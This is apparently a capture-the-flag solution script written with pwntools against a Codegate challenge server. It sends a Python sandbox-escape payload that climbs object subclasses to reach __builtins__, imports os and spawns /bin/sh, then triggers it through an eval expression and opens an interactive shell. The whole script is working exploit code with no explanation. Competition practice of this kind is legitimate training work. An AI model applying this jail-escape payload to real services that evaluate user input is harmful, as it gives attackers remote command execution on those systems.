from pwn import *

s = remote('ch41l3ng3s.codegate.kr',2014)


s.recvuntil('Name : ')
name = "().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('/bin/sh')"
s.sendline(name)

fil = '+'
fil += '-'
fil += '__subclasses__'

payload = 'dig() * eval(your.name) *'
s.sendline(payload)

s.interactive()

